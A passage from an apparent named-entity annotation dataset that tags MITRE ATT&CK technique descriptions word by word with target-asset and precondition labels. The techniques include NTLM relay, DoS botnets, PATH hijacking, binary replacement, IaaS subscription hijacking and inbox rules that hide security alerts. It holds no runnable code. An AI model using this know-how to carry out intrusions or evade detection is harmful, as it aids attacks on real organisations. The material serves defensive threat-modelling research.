Force](https://attack.mitre.org/techniques/T1110) O
to O
obtain O
the O
plaintext O
passwords B-TARGET_ASSET
. O 

In O
some O
cases O
where O
an O
adversary O
has O
access O
to O
a O
system B-TARGET_ASSET
that O
is O
in O
the O
authentication O
path O
between O
systems O
or O
when O
automated O
scans O
that O
use O
credentials B-TARGET_ASSET
attempt O
to O
authenticate O
to O
an O
adversary O
controlled O
system B-TARGET_ASSET
, O
the O
NTLMv2 B-TARGET_ASSET
hashes I-TARGET_ASSET
can O
be O
intercepted O
and O
relayed O
to O
access O
and O
execute O
code O
against O
a O
target O
system B-TARGET_ASSET
. O 

The O
relay O
step O
can O
happen O
in O
conjunction O
with O
poisoning O
but O
may O
also O
be O
independent O
of O
it O
. O 

(Citation: O
byt3bl33d3r O
NTLM O
Relaying)(Citation: O
Secure O
Ideas O
SMB O
Relay) O

Several O
tools B-TARGET_ASSET
exist O
that O
can O
be O
used O
to O
poison O
name O
services B-TARGET_ASSET
within O
local O
networks B-TARGET_ASSET
such O
as O
NBNSpoof B-TARGET_ASSET
, O
Metasploit B-TARGET_ASSET
, O
and O
[Responder](https://attack.mitre.org/software/S0174) B-TARGET_ASSET
. O 

(Citation: O
GitHub O
NBNSpoof) O
(Citation: O
Rapid7 O
LLMNR O
Spoofer) O
(Citation: O
GitHub O
Responder) O

Adversaries O
may O
gather O
the O
victim's O
IP B-TARGET_ASSET
addresses I-TARGET_ASSET
that O
can O
be O
used O
during O
targeting O
. O 

Public O
IP B-TARGET_ASSET
addresses I-TARGET_ASSET
may O
be O
allocated B-PRECON
to O
organizations O
by O
block O
, O
or O
a O
range O
of O
sequential O
addresses O
. O 

Information O
about O
assigned O
IP B-TARGET_ASSET
addresses I-TARGET_ASSET
may O
include O
a O
variety O
of O
details O
, O
such O
as O
which O
IP B-TARGET_ASSET
addresses I-TARGET_ASSET
are O
in B-PRECON
use I-PRECON
. O 

IP B-TARGET_ASSET
addresses I-TARGET_ASSET
may O
also O
enable O
an O
adversary O
to O
derive O
other O
details O
about O
a O
victim O
, O
such O
as O
organizational O
size O
, O
physical O
location(s) O
, O
Internet O
service O
provider O
, O
and O
or O
where/how O
their O
publicly-facing O
infrastructure B-TARGET_ASSET
is O
hosted O
. O 


Adversaries O
may O
gather O
this O
information O
in O
various O
ways O
, O
such O
as O
direct O
collection O
actions O
via O
[Active O
Scanning](https://attack.mitre.org/techniques/T1595) O
or O
[Phishing O
for O
Information](https://attack.mitre.org/techniques/T1598) O
. O 

Information O
about O
assigned O
IP B-TARGET_ASSET
addresses I-TARGET_ASSET
may O
also O
be O
exposed B-PRECON
to O
adversaries O
via O
online O
or O
other O
accessible O
data O
sets O
(ex: O
[Search O
Open O
Technical O
Databases](https://attack.mitre.org/techniques/T1596)) O
. O 

(Citation: O
WHOIS)(Citation: O
DNS O
Dumpster)(Citation: O
Circl O
Passive O
DNS) O
Gathering O
this O
information O
may O
reveal O
opportunities O
for O
other O
forms O
of O
reconnaissance O
(ex: O
[Active O
Scanning](https://attack.mitre.org/techniques/T1595) O
or O
[Search O
Open O
Websites/Domains](https://attack.mitre.org/techniques/T1593)) O
, O
establishing O
operational O
resources O
(ex: O
[Acquire O
Infrastructure](https://attack.mitre.org/techniques/T1583) O
or O
[Compromise O
Infrastructure](https://attack.mitre.org/techniques/T1584)) O
, O
and/or O
initial O
access O
(ex: O
[External O
Remote O
Services](https://attack.mitre.org/techniques/T1133)) O
. O 


Adversaries O
may O
attempt O
to O
cause O
a O
denial O
of O
service O
(DoS) O
by O
directly O
sending O
a O
high-volume O
of O
network O
traffic B-TARGET_ASSET
to O
a O
target O
. O 

This O
DoS O
attack O
may O
also O
reduce O
the O
availability O
and O
functionality O
of O
the O
targeted O
system(s) B-TARGET_ASSET
and O
network B-TARGET_ASSET
. O 

[Direct B-TARGET_ASSET
Network I-TARGET_ASSET
Flood](https://attack.mitre.org/techniques/T1498/001) I-TARGET_ASSET
s O
are O
when O
one O
or O
more O
systems B-TARGET_ASSET
are O
used O
to O
send O
a O
high-volume O
of O
network B-TARGET_ASSET
packets I-TARGET_ASSET
towards O
the O
targeted O
service's B-TARGET_ASSET
network I-TARGET_ASSET
. O 

Almost O
any O
network B-TARGET_ASSET
protocol I-TARGET_ASSET
may O
be O
used O
for O
flooding O
. O 

Stateless O
protocols B-TARGET_ASSET
such O
as O
UDP B-TARGET_ASSET
or O
ICMP B-TARGET_ASSET
are O
commonly O
used O
but O
stateful O
protocols B-TARGET_ASSET
such O
as O
TCP B-TARGET_ASSET
can O
be O
used O
as O
well O
. O 


Botnets B-TARGET_ASSET
are O
commonly O
used O
to O
conduct O
network B-TARGET_ASSET
flooding I-TARGET_ASSET
attacks I-TARGET_ASSET
against O
networks B-TARGET_ASSET
and O
services B-TARGET_ASSET
. O 

Large O
botnets B-TARGET_ASSET
can O
generate O
a O
significant O
amount O
of O
traffic O
from O
systems B-TARGET_ASSET
spread B-PRECON
across I-PRECON
the I-PRECON
global I-PRECON
Internet I-PRECON
. O 

Adversaries O
may O
have O
the O
resources O
to O
build O
out O
and O
control O
their O
own O
botnet B-TARGET_ASSET
infrastructure I-TARGET_ASSET
or O
may O
rent O
time O
on O
an O
existing O
botnet B-TARGET_ASSET
to O
conduct O
an O
attack O
. O 

In O
some O
of O
the O
worst O
cases O
for O
distributed O
DoS O
(DDoS) O
, O
so O
many O
systems B-TARGET_ASSET
are O
used O
to O
generate O
the O
flood O
that O
each O
one O
only O
needs O
to O
send O
out O
a O
small O
amount O
of O
traffic O
to O
produce O
enough O
volume O
to O
saturate O
the O
target O
network B-TARGET_ASSET
. O 

In O
such O
circumstances O
, O
distinguishing O
DDoS O
traffic O
from O
legitimate O
clients O
becomes O
exceedingly O
difficult O
. O 

Botnets B-TARGET_ASSET
have O
been O
used O
in O
some O
of O
the O
most O
high-profile O
DDoS O
flooding O
attacks O
, O
such O
as O
the O
2012 O
series O
of O
incidents O
that O
targeted O
major O
US O
banks O
. O 

(Citation: O
USNYAG O
IranianBotnet O
March O
2016) O

Adversaries O
may O
insert O
, O
delete O
, O
or O
manipulate O
data B-TARGET_ASSET
at B-PRECON
rest I-PRECON
in O
order O
to O
manipulate O
external O
outcomes O
or O
hide O
activity O
. O 

(Citation: O
FireEye O
APT38 O
Oct O
2018)(Citation: O
DOJ O
Lazarus O
Sony O
2018) O
By O
manipulating O
stored O
data B-TARGET_ASSET
, O
adversaries O
may O
attempt O
to O
affect O
a O
business O
process O
, O
organizational O
understanding O
, O
and O
decision O
making O
. O 


Stored O
data B-TARGET_ASSET
could O
include O
a O
variety O
of O
file B-TARGET_ASSET
formats I-TARGET_ASSET
, O
such O
as O
Office O
files B-TARGET_ASSET
, O
databases B-TARGET_ASSET
, O
stored O
emails B-TARGET_ASSET
, O
and O
custom O
file B-TARGET_ASSET
formats I-TARGET_ASSET
. O 

The O
type O
of O
modification O
and O
the O
impact O
it O
will O
have O
depends O
on O
the O
type O
of O
data O
as O
well O
as O
the O
goals O
and O
objectives O
of O
the O
adversary O
. O 

For O
complex O
systems O
, O
an O
adversary O
would O
likely O
need O
special O
expertise O
and O
possibly O
access O
to O
specialized O
software O
related O
to O
the O
system O
that O
would O
typically O
be O
gained O
through O
a O
prolonged O
information O
gathering O
campaign O
in O
order O
to O
have O
the O
desired O
impact O
. O 


Adversaries O
may O
execute O
their O
own O
malicious O
payloads B-TARGET_ASSET
by O
hijacking O
environment B-TARGET_ASSET
variables I-TARGET_ASSET
used O
to O
load O
libraries B-TARGET_ASSET
. O 

The O
PATH B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
contains O
a O
list O
of O
directories O
(User O
and O
System) O
that O
the O
OS B-TARGET_ASSET
searches O
sequentially O
through O
in O
search O
of O
the O
binary B-TARGET_ASSET
that O
was O
called O
from O
a O
script O
or O
the O
command O
line O
. O 


Adversaries O
can O
place O
a O
malicious O
program B-TARGET_ASSET
in O
an O
earlier O
entry O
in O
the O
list O
of O
directories O
stored O
in O
the O
PATH B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
, O
resulting O
in O
the O
operating B-TARGET_ASSET
system I-TARGET_ASSET
executing O
the O
malicious O
binary B-TARGET_ASSET
rather O
than O
the O
legitimate O
binary B-TARGET_ASSET
when O
it O
searches O
sequentially O
through O
that O
PATH O
listing O
. O 


For O
example O
, O
on O
Windows O
if O
an O
adversary O
places O
a O
malicious O
program B-TARGET_ASSET
named O
""net.exe"" O
in O
`C:\example O
path` O
, O
which O
by O
default B-PRECON
precedes I-PRECON
`C:\Windows\system32\net.exe` O
in O
the O
PATH B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
, O
when O
""net"" O
is O
executed O
from O
the O
command-line O
the O
`C:\example O
path` O
will O
be O
called O
instead O
of O
the O
system's O
legitimate O
executable B-TARGET_ASSET
at O
`C:\Windows\system32\net.exe` O
. O 

Some O
methods O
of O
executing O
a O
program B-TARGET_ASSET
rely O
on O
the O
PATH B-TARGET_ASSET
environment I-TARGET_ASSET
variable I-TARGET_ASSET
to O
determine O
the O
locations O
that O
are O
searched O
when O
the O
path O
for O
the O
program B-TARGET_ASSET
is O
not O
given O
, O
such O
as O
executing O
programs B-TARGET_ASSET
from O
a O
[Command B-TARGET_ASSET
and I-TARGET_ASSET
Scripting I-TARGET_ASSET
Interpreter](https://attack.mitre.org/techniques/T1059) I-TARGET_ASSET
. O 

(Citation: O
ExpressVPN O
PATH O
env O
Windows O
2021) O

Adversaries O
may O
also O
directly O
modify O
the O
$PATH B-TARGET_ASSET
variable I-TARGET_ASSET
specifying O
the O
directories O
to O
be O
searched O
. O 

An O
adversary O
can O
modify O
the O
`$PATH` B-TARGET_ASSET
variable I-TARGET_ASSET
to O
point O
to O
a O
directory O
they O
have O
write O
access O
. O 

When O
a O
program B-TARGET_ASSET
using O
the O
$PATH B-TARGET_ASSET
variable I-TARGET_ASSET
is O
called O
, O
the O
OS B-TARGET_ASSET
searches O
the O
specified O
directory O
and O
executes O
the O
malicious O
binary B-TARGET_ASSET
. O 

On O
macOS O
, O
this O
can O
also O
be O
performed O
through O
modifying O
the O
$HOME B-TARGET_ASSET
variable I-TARGET_ASSET
. O 

These O
variables B-TARGET_ASSET
can O
be O
modified O
using O
the O
command-line O
, O
launchctl O
, O
[Unix O
Shell O
Configuration O
Modification](https://attack.mitre.org/techniques/T1546/004) O
, O
or O
modifying O
the O
`/etc/paths.d` O
folder O
contents O
. O 

(Citation: O
uptycs O
Fake O
POC O
linux O
malware O
2023)(Citation: O
nixCraft O
macOS O
PATH O
variables)(Citation: O
Elastic O
Rules O
macOS O
launchctl O
2022) O

Adversaries O
may O
leverage O
the O
SharePoint B-TARGET_ASSET
repository I-TARGET_ASSET
as O
a O
source O
to O
mine O
valuable O
information O
. O 

SharePoint B-TARGET_ASSET
will O
often O
contain O
useful O
information O
for O
an O
adversary O
to O
learn O
about O
the O
structure O
and O
functionality O
of O
the O
internal O
network B-TARGET_ASSET
and O
systems B-TARGET_ASSET
. O 

For O
example O
, O
the O
following O
is O
a O
list O
of O
example O
information O
that O
may O
hold O
potential O
value O
to O
an O
adversary O
and O
may O
also O
be O
found O
on O
SharePoint B-TARGET_ASSET
: O

* O
Policies O
, O
procedures O
, O
and O
standards O
* O
Physical O
/ O
logical O
network B-TARGET_ASSET
diagrams I-TARGET_ASSET
* O
System B-TARGET_ASSET
architecture I-TARGET_ASSET
diagrams I-TARGET_ASSET
* O
Technical O
system B-TARGET_ASSET
documentation I-TARGET_ASSET
* O
Testing O
/ O
development O
credentials B-TARGET_ASSET
(i.e., O
[Unsecured B-TARGET_ASSET
Credentials](https://attack.mitre.org/techniques/T1552) I-TARGET_ASSET
) O
* O
Work O
/ O
project O
schedules O
* O
Source O
code O
snippets O
* O
Links O
to O
network B-TARGET_ASSET
shares I-TARGET_ASSET
and O
other O
internal O
resources O

Adversaries O
may O
directly O
access O
a O
volume B-TARGET_ASSET
to O
bypass O
file B-TARGET_ASSET
access I-TARGET_ASSET
controls I-TARGET_ASSET
and O
file B-TARGET_ASSET
system I-TARGET_ASSET
monitoring I-TARGET_ASSET
. O 

Windows O
allows O
programs O
to O
have O
direct B-PRECON
access I-PRECON
to O
logical B-TARGET_ASSET
volumes I-TARGET_ASSET
. O 

Programs O
with O
direct B-PRECON
access I-PRECON
may O
read O
and O
write O
files B-TARGET_ASSET
directly O
from O
the O
drive B-TARGET_ASSET
by O
analyzing O
file B-TARGET_ASSET
system I-TARGET_ASSET
data I-TARGET_ASSET
structures I-TARGET_ASSET
. O 

This O
technique O
may O
bypass O
Windows O
file B-TARGET_ASSET
access I-TARGET_ASSET
controls I-TARGET_ASSET
as O
well O
as O
file B-TARGET_ASSET
system I-TARGET_ASSET
monitoring I-TARGET_ASSET
tools I-TARGET_ASSET
. O 

(Citation: O
Hakobyan O
2009) O

Utilities B-TARGET_ASSET
, O
such O
as O
`NinjaCopy` O
, O
exist O
to O
perform O
these O
actions O
in O
PowerShell B-TARGET_ASSET
. O 

(Citation: O
Github O
PowerSploit O
Ninjacopy) O
Adversaries O
may O
also O
use O
built-in O
or O
third-party O
utilities B-TARGET_ASSET
(such O
as O
`vssadmin` O
, O
`wbadmin` O
, O
and O
[esentutl](https://attack.mitre.org/software/S0404) B-TARGET_ASSET
) O
to O
create O
shadow B-TARGET_ASSET
copies I-TARGET_ASSET
or O
backups B-TARGET_ASSET
of O
data B-TARGET_ASSET
from O
system B-TARGET_ASSET
volumes I-TARGET_ASSET
. O 

(Citation: O
LOLBAS O
Esentutl) O

Processes O
may O
automatically O
execute O
specific O
binaries B-TARGET_ASSET
as O
part O
of O
their O
functionality O
or O
to O
perform O
other O
actions O
. O 

If O
the O
permissions O
on O
the O
file B-TARGET_ASSET
system I-TARGET_ASSET
directory I-TARGET_ASSET
containing O
a O
target O
binary B-TARGET_ASSET
, O
or O
permissions O
on O
the O
binary B-TARGET_ASSET
itself O
, O
are O
improperly B-PRECON
set I-PRECON
, O
then O
the O
target O
binary B-TARGET_ASSET
may O
be O
overwritten O
with O
another O
binary B-TARGET_ASSET
using O
user-level O
permissions O
and O
executed O
by O
the O
original O
process B-TARGET_ASSET
. O 

If O
the O
original O
process B-TARGET_ASSET
and O
thread O
are O
running B-PRECON
under I-PRECON
a I-PRECON
higher I-PRECON
permissions I-PRECON
level I-PRECON
, O
then O
the O
replaced O
binary B-TARGET_ASSET
will O
also O
execute O
under O
higher-level O
permissions O
, O
which O
could O
include O
SYSTEM O
. O 


Adversaries O
may O
use O
this O
technique O
to O
replace O
legitimate O
binaries B-TARGET_ASSET
with O
malicious O
ones O
as O
a O
means O
of O
executing O
code O
at O
a O
higher O
permissions O
level O
. O 

If O
the O
executing O
process B-TARGET_ASSET
is O
set B-PRECON
to I-PRECON
run I-PRECON
at I-PRECON
a I-PRECON
specific I-PRECON
time I-PRECON
or O
during O
a O
certain O
event O
(e.g., O
system O
bootup) O
then O
this O
technique O
can O
also O
be O
used O
for O
persistence O
. O 


### O
Services O
Manipulation O
of O
Windows O
service B-TARGET_ASSET
binaries I-TARGET_ASSET
is O
one O
variation O
of O
this O
technique O
. O 

Adversaries O
may O
replace O
a O
legitimate O
service B-TARGET_ASSET
executable I-TARGET_ASSET
with O
their O
own O
executable B-TARGET_ASSET
to O
gain O
persistence O
and/or O
privilege O
escalation O
to O
the O
account O
context O
the O
service B-TARGET_ASSET
is O
set B-PRECON
to I-PRECON
execute I-PRECON
under I-PRECON
(local/domain O
account, O
SYSTEM, O
LocalService, O
or O
NetworkService) O
. O 

Once O
the O
service B-TARGET_ASSET
is O
started O
, O
either O
directly O
by O
the O
user O
(if O
appropriate O
access O
is O
available) O
or O
through O
some O
other O
means O
, O
such O
as O
a O
system O
restart O
if O
the O
service B-TARGET_ASSET
starts B-PRECON
on I-PRECON
bootup I-PRECON
, O
the O
replaced O
executable B-TARGET_ASSET
will O
run O
instead O
of O
the O
original O
service B-TARGET_ASSET
executable I-TARGET_ASSET
. O 


### O
Executable O
Installers O
Another O
variation O
of O
this O
technique O
can O
be O
performed O
by O
taking O
advantage O
of O
a O
weakness O
that O
is O
common O
in O
executable B-TARGET_ASSET
, O
self-extracting B-TARGET_ASSET
installers I-TARGET_ASSET
. O 

During O
the O
installation O
process O
, O
it O
is O
common O
for O
installers B-TARGET_ASSET
to O
use O
a O
subdirectory O
within O
the O
<code>%TEMP%</code> O
directory O
to O
unpack O
binaries B-TARGET_ASSET
such O
as O
DLLs B-TARGET_ASSET
, O
EXEs B-TARGET_ASSET
, O
or O
other O
payloads B-TARGET_ASSET
. O 

When O
installers B-TARGET_ASSET
create O
subdirectories O
and O
files O
they O
often O
do O
not O
set O
appropriate O
permissions O
to O
restrict O
write O
access O
, O
which O
allows O
for O
execution O
of O
untrusted O
code O
placed O
in O
the O
subdirectories O
or O
overwriting O
of O
binaries B-TARGET_ASSET
used O
in O
the O
installation O
process O
. O 

This O
behavior O
is O
related O
to O
and O
may O
take O
advantage O
of O
[DLL B-TARGET_ASSET
Search I-TARGET_ASSET
Order I-TARGET_ASSET
Hijacking](https://attack.mitre.org/techniques/T1038) I-TARGET_ASSET
. O 

Some O
installers B-TARGET_ASSET
may O
also O
require O
elevated B-PRECON
privileges I-PRECON
that O
will O
result O
in O
privilege O
escalation O
when O
executing O
adversary O
controlled O
code O
. O 

This O
behavior O
is O
related O
to O
[Bypass O
User O
Account O
Control](https://attack.mitre.org/techniques/T1088) O
. O 

Several O
examples O
of O
this O
weakness O
in O
existing O
common O
installers B-TARGET_ASSET
have O
been O
reported O
to O
software O
vendors O
. O 

(Citation: O
Mozilla O
Firefox O
Installer O
DLL O
Hijack) O
(Citation: O
Seclists O
Kanthak O
7zip O
Installer) O

Adversaries O
may O
obtain O
access O
to O
generative B-TARGET_ASSET
artificial I-TARGET_ASSET
intelligence I-TARGET_ASSET
tools I-TARGET_ASSET
, O
such O
as O
large B-TARGET_ASSET
language I-TARGET_ASSET
models I-TARGET_ASSET
( I-TARGET_ASSET
LLMs I-TARGET_ASSET
) I-TARGET_ASSET
, O
to O
aid O
various O
techniques O
during O
targeting O
. O 

These O
tools B-TARGET_ASSET
may O
be O
used O
to O
inform O
, O
bolster O
, O
and O
enable O
a O
variety O
of O
malicious O
tasks O
, O
including O
conducting O
[Reconnaissance](https://attack.mitre.org/tactics/TA0043) O
, O
creating O
basic O
scripts B-TARGET_ASSET
, O
assisting O
social O
engineering O
, O
and O
even O
developing O
payloads B-TARGET_ASSET
. O 

(Citation: O
MSFT-AI) O

For O
example O
, O
by O
utilizing O
a O
publicly B-PRECON
available I-PRECON
LLM B-TARGET_ASSET
an O
adversary O
is O
essentially O
outsourcing O
or O
automating O
certain O
tasks O
to O
the O
tool B-TARGET_ASSET
. O 

Using O
AI O
, O
the O
adversary O
may O
draft O
and O
generate O
content O
in O
a O
variety O
of O
written O
languages O
to O
be O
used O
in O
[Phishing](https://attack.mitre.org/techniques/T1566)/[Phishing O
for O
Information](https://attack.mitre.org/techniques/T1598) O
campaigns O
. O 

The O
same O
publicly B-PRECON
available I-PRECON
tool B-TARGET_ASSET
may O
further O
enable O
vulnerability O
or O
other O
offensive O
research O
supporting O
[Develop O
Capabilities](https://attack.mitre.org/techniques/T1587) O
. O 

AI B-TARGET_ASSET
tools I-TARGET_ASSET
may O
also O
automate O
technical O
tasks O
by O
generating O
, O
refining O
, O
or O
otherwise O
enhancing O
(e.g., O
[Obfuscated O
Files O
or O
Information](https://attack.mitre.org/techniques/T1027)) O
malicious O
scripts B-TARGET_ASSET
and O
payloads B-TARGET_ASSET
. O 

(Citation: O
OpenAI-CTI) O
Finally O
, O
AI-generated O
text O
, O
images O
, O
audio O
, O
and O
video O
may O
be O
used O
for O
fraud O
, O
[Impersonation](https://attack.mitre.org/techniques/T1656) O
, O
and O
other O
malicious O
activities O
. O 

(Citation: O
Google-Vishing24)(Citation: O
IC3-AI24)(Citation: O
WSJ-Vishing-AI24) O

Adversaries O
may O
attempt O
to O
modify O
hierarchical O
structures O
in O
infrastructure-as-a-service B-TARGET_ASSET
( I-TARGET_ASSET
IaaS I-TARGET_ASSET
) I-TARGET_ASSET
environments I-TARGET_ASSET
in O
order O
to O
evade O
defenses O
. O 


IaaS B-TARGET_ASSET
environments I-TARGET_ASSET
often O
group O
resources O
into O
a O
hierarchy O
, O
enabling O
improved O
resource O
management O
and O
application O
of O
policies O
to O
relevant O
groups O
. O 

Hierarchical O
structures O
differ O
among O
cloud O
providers O
. O 

For O
example O
, O
in O
AWS B-TARGET_ASSET
environments I-TARGET_ASSET
, O
multiple O
accounts B-TARGET_ASSET
can O
be O
grouped O
under O
a O
single O
organization B-TARGET_ASSET
, O
while O
in O
Azure B-TARGET_ASSET
environments I-TARGET_ASSET
, O
multiple O
subscriptions B-TARGET_ASSET
can O
be O
grouped O
under O
a O
single O
management B-TARGET_ASSET
group I-TARGET_ASSET
. O 

(Citation: O
AWS O
Organizations)(Citation: O
Microsoft O
Azure O
Resources) O

Adversaries O
may O
add O
, O
delete O
, O
or O
otherwise O
modify O
resource B-TARGET_ASSET
groups I-TARGET_ASSET
within O
an O
IaaS B-TARGET_ASSET
hierarchy I-TARGET_ASSET
. O 

For O
example O
, O
in O
Azure B-TARGET_ASSET
environments I-TARGET_ASSET
, O
an O
adversary O
who O
has O
gained O
access O
to O
a O
Global O
Administrator O
account B-TARGET_ASSET
may O
create O
new O
subscriptions B-TARGET_ASSET
in O
which O
to O
deploy O
resources O
. O 

They O
may O
also O
engage O
in O
subscription O
hijacking O
by O
transferring O
an O
existing O
pay-as-you-go O
subscription B-TARGET_ASSET
from O
a O
victim O
tenant O
to O
an O
adversary-controlled O
tenant O
. O 

This O
will O
allow O
the O
adversary O
to O
use O
the O
victim’s O
compute O
resources O
without O
generating O
logs B-TARGET_ASSET
on O
the O
victim O
tenant O
. O 

(Citation: O
Microsoft O
Peach O
Sandstorm O
2023)(Citation: O
Microsoft O
Subscription O
Hijacking O
2022) O

In O
AWS B-TARGET_ASSET
environments I-TARGET_ASSET
, O
adversaries O
with O
appropriate O
permissions O
in O
a O
given O
account B-TARGET_ASSET
may O
call O
the O
`LeaveOrganization` B-TARGET_ASSET
API I-TARGET_ASSET
, O
causing O
the O
account B-TARGET_ASSET
to O
be O
severed O
from O
the O
AWS B-TARGET_ASSET
Organization I-TARGET_ASSET
to O
which O
it O
was O
tied O
and O
removing O
any O
Service B-TARGET_ASSET
Control I-TARGET_ASSET
Policies I-TARGET_ASSET
, O
guardrails O
, O
or O
restrictions O
imposed O
upon O
it O
by O
its O
former O
Organization B-TARGET_ASSET
. O 

Alternatively O
, O
adversaries O
may O
call O
the O
`CreateAccount` B-TARGET_ASSET
API I-TARGET_ASSET
in O
order O
to O
create O
a O
new O
account B-TARGET_ASSET
within O
an O
AWS B-TARGET_ASSET
Organization I-TARGET_ASSET
. O 

This O
account B-TARGET_ASSET
will O
use O
the O
same O
payment O
methods O
registered O
to O
the O
payment O
account O
but O
may O
not O
be O
subject O
to O
existing O
detections O
or O
Service B-TARGET_ASSET
Control I-TARGET_ASSET
Policies I-TARGET_ASSET
. O 

(Citation: O
AWS O
RE:Inforce O
Threat O
Detection O
2024) O

Adversaries O
may O
use O
email B-TARGET_ASSET
rules I-TARGET_ASSET
to O
hide O
inbound O
emails B-TARGET_ASSET
in O
a O
compromised O
user's O
mailbox B-TARGET_ASSET
. O 

Many O
email B-TARGET_ASSET
clients I-TARGET_ASSET
allow O
users O
to O
create O
inbox B-TARGET_ASSET
rules I-TARGET_ASSET
for O
various O
email O
functions O
, O
including O
moving O
emails B-TARGET_ASSET
to O
other O
folders O
, O
marking O
emails B-TARGET_ASSET
as O
read O
, O
or O
deleting O
emails B-TARGET_ASSET
. O 

Rules B-TARGET_ASSET
may O
be O
created O
or O
modified O
within O
email B-TARGET_ASSET
clients I-TARGET_ASSET
or O
through O
external O
features O
such O
as O
the O
<code>New-InboxRule</code> O
or O
<code>Set-InboxRule</code> O
[PowerShell](https://attack.mitre.org/techniques/T1059/001) B-TARGET_ASSET
cmdlets I-TARGET_ASSET
on O
Windows O
systems B-TARGET_ASSET
. O 

(Citation: O
Microsoft O
Inbox O
Rules)(Citation: O
MacOS O
Email O
Rules)(Citation: O
Microsoft O
New-InboxRule)(Citation: O
Microsoft O
Set-InboxRule) O

Adversaries O
may O
utilize O
email B-TARGET_ASSET
rules I-TARGET_ASSET
within O
a O
compromised O
user's O
mailbox B-TARGET_ASSET
to O
delete O
and/or O
move O
emails B-TARGET_ASSET
to O
less O
noticeable O
folders O
. O 

Adversaries O
may O
do O
this O
to O
hide O
security O
alerts B-TARGET_ASSET
, O
C2 O
communication B-TARGET_ASSET
, O
or O
responses O
to O
[Internal O
Spearphishing](https://attack.mitre.org/techniques/T1534) O
emails B-TARGET_ASSET
sent O
from O
the O
compromised O
account B-TARGET_ASSET
. O 


Any O
user O
or O
administrator O
within O
the O
organization O
(or O
adversary O
with O
valid O
credentials) O
may O
be O
able O
to O
create O
rules B-TARGET_ASSET
to O
automatically O
move O
or O
delete O
emails B-TARGET_ASSET
. O 

These O
rules B-TARGET_ASSET
can O
be O
abused O
to O
impair/delay O
detection O
had O
the O
email B-TARGET_ASSET
content I-TARGET_ASSET
been O
immediately O
seen O
by O
a O
user O
or O
defender O
. O 

Malicious O
rules B-TARGET_ASSET
commonly O
filter O
out O
emails B-TARGET_ASSET
based O
on O
key O
words O
(such O
as O
<code>malware</code> O
, O
<code>suspicious</code> O
, O
<code>phish</code> O
, O
and O
<code>hack</code>) O
found O
in O
message B-TARGET_ASSET
bodies I-TARGET_ASSET
and O
subject B-TARGET_ASSET
lines I-TARGET_ASSET
. O 

(Citation: O
Microsoft O
Cloud O
App O
Security) O

In O
some O
environments O
, O
administrators O
may O
be O
able O
to O
enable O
email B-TARGET_ASSET
rules I-TARGET_ASSET
that O
operate B-PRECON
organization-wide I-PRECON
rather O
than O
on O
individual O
inboxes B-TARGET_ASSET
. O 

For O
example O
, O
Microsoft B-TARGET_ASSET
Exchange I-TARGET_ASSET
supports O
transport B-TARGET_ASSET
rules I-TARGET_ASSET
that O
evaluate O
all O
mail B-TARGET_ASSET
an O
organization O
receives O
against O
user-specified O
conditions O
, O
then O
performs O
a O
user-specified O
action O
on O
mail B-TARGET_ASSET
that O
adheres O
to O
those O
conditions O
. O 

(Citation: O
Microsoft O
Mail O
Flow O
Rules O
2023) O
Adversaries O
that O
abuse O
such O
features O
may O
be O
able O
to O
automatically O
modify O
or O
delete O
all O
emails B-TARGET_ASSET
related O
to O
specific O
topics O
(such O
as O
internal O
security O
incident O
notifications) O
. O 


An O
adversary O
may O
deface O
systems B-TARGET_ASSET
external B-PRECON
to I-PRECON
an I-PRECON
organization I-PRECON
in O
an O
attempt O
to O
deliver O
messaging O
, O
intimidate O
, O
or O
otherwise O
mislead O
an O
organization O
or O
users O
. O 

[External O
Defacement](https://attack.mitre.org/techniques/T1491/002) O
may O
ultimately O
cause O
users O
to O
distrust O
the O
systems B-TARGET_ASSET
and O
to O
question/discredit O
the O
system’s B-TARGET_ASSET
integrity I-TARGET_ASSET
. O 

Externally-facing B-PRECON
websites B-TARGET_ASSET
are O
a O
common O
victim O
of O
defacement O
; O
often O
targeted O
by O
adversary O
and O
hacktivist O
groups O
in O
order O
to O
push O
a O
political O
message O
or O
spread O
propaganda O
. O 

(Citation: O
FireEye O
Cyber O
Threats O
to O
Media O
Industries)(Citation: O
Kevin O
Mandia O
Statement O
to O
US O
Senate O
Committee O
on O
Intelligence)(Citation: O
Anonymous O
Hackers O
Deface O
Russian O
Govt O
Site) O
[External O
Defacement](https://attack.mitre.org/techniques/T1491/002) O
may O
be O
used O
as O
a O
catalyst O
to O
trigger O
events O
, O
or O
as O
a O
response O
to O
actions O
taken O
by O
an O
organization O
or O
government O
. O 

Similarly O
, O
website B-TARGET_ASSET
defacement I-TARGET_ASSET
may O
also O
be O
used O
as O
setup O
, O
or O
a O
precursor O
, O
for O
future O
attacks O
such O
as O
[Drive-by B-TARGET_ASSET
Compromise](https://attack.mitre.org/techniques/T1189) I-TARGET_ASSET
. O 

(Citation: O
Trend O
Micro O
Deep O
Dive O
Into O
Defacement) O

Adversaries O
may O
encrypt O
or O
encode O
files B-TARGET_ASSET
to O
obfuscate O
strings O
, O
bytes O
, O
and O
other O
specific O
patterns O
to O
impede O
detection O
. O 

Encrypting O
and/or O
encoding O
file B-TARGET_ASSET
content I-TARGET_ASSET
aims O
to O
conceal O
malicious O
artifacts O
within O
a O
file B-TARGET_ASSET
used O
in O
an O
intrusion O
. O 

Many O
other O
techniques O
, O
such O
as O
[Software B-TARGET_ASSET
Packing](https://attack.mitre.org/techniques/T1027/002) I-TARGET_ASSET
, O
[Steganography](https://attack.mitre.org/techniques/T1027/003) O
, O
and O
[Embedded B-TARGET_ASSET
Payloads](https://attack.mitre.org/techniques/T1027/009) I-TARGET_ASSET
, O
share O
this O
same O
broad O
objective O
. O 

Encrypting O
and/or O
encoding O
files B-TARGET_ASSET
could O
lead O
to O
a O
lapse O
in O
detection O
of O
static O
signatures O
, O
only O
for O
this O
malicious O
content O
to O
be O
revealed O
(i.e., O
[Deobfuscate/Decode O
Files O
or O
Information](https://attack.mitre.org/techniques/T1140)) O
at O
the O
time O
of O
execution/use O
. O 


This O
type O
of O
file O
obfuscation O
can O
be O
applied O
to O
many O
file B-TARGET_ASSET
artifacts I-TARGET_ASSET
present O
on O
victim O
hosts B-TARGET_ASSET
, O
such O
as O
malware B-TARGET_ASSET
log/configuration I-TARGET_ASSET
and O
payload B-TARGET_ASSET
files I-TARGET_ASSET
. O 

(Citation: O
File O
obfuscation) O
Files B-TARGET_ASSET
can O
be O
encrypted B-PRECON
with I-PRECON
